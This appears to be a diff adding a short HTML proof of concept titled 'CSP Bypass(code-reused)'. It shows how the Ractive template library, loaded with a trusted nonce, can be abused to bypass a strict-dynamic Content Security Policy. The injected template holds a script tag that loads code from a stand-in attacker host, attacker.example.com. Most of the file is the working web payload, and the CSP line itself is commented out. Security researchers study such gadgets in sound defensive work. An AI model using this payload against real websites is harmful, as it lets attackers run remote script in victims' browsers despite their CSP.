@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>CSP Bypass(code-reused)</title>
+    <!-- <meta http-equiv=content-security-policy content="object-src 'none'; script-src 'nonce-secret123' 'strict-dynamic' https: http:;"> -->
+    <script nonce="secret123" src='https://cdn.jsdelivr.net/npm/ractive'></script>
+</head>
+
+<body>
+  <div id='container'></div>
+  <script id='template' type='text/ractive'><!-- --><script src='http://attacker.example.com/shout/' /></script>
+  <script id="template" type="foo">Hi</script>
+  <script nonce="secret123">
+    var ractive = new Ractive({
+      el: '#container',
+      template: '#template',
+      data: { name: 'world' }
+    });
+  </script>
+</body>
+</body>
+
+</html>
